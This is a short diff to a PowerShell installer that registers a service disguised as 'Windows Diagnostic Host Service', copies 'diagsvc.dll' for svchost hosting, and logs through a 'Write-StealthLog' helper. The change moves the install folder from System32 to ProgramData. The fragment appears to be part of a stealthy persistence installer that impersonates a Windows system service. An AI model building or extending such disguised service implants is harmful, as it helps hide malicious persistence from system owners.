@@ -54,8 +54,12 @@ if ($PSBoundParameters.ContainsKey("LogPath") -and -not [string]::IsNullOrWhiteS
 $ServiceName = "WinDiagnosticHost"
 $DisplayName = "Windows Diagnostic Host Service"
 $Description = "system health monitoring. If this service is stopped, certain features may not function properly."
-$InstallDir = "$env:SystemRoot\System32\DiagnosticHost"
-$LogsDir = "$InstallDir\logs"
+$ProgramDataRoot = [Environment]::GetFolderPath('CommonApplicationData')
+if (-not $ProgramDataRoot) {
+    $ProgramDataRoot = Join-Path $env:SystemRoot 'ProgramData'
+}
+$InstallDir = Join-Path $ProgramDataRoot 'DiagnosticHost'
+$LogsDir = Join-Path $InstallDir 'logs'
 
 # ================================================================
 # Helper Functions
@@ -156,7 +160,7 @@ catch {
 }
 
 # Step 2: Copy files
-Write-StealthLog "Copying files to System32..."
+Write-StealthLog "Copying files to install directory..."
 try {
     if ($Mode -eq 'svchost') {
         $destPath = Join-Path $InstallDir "diagsvc.dll"
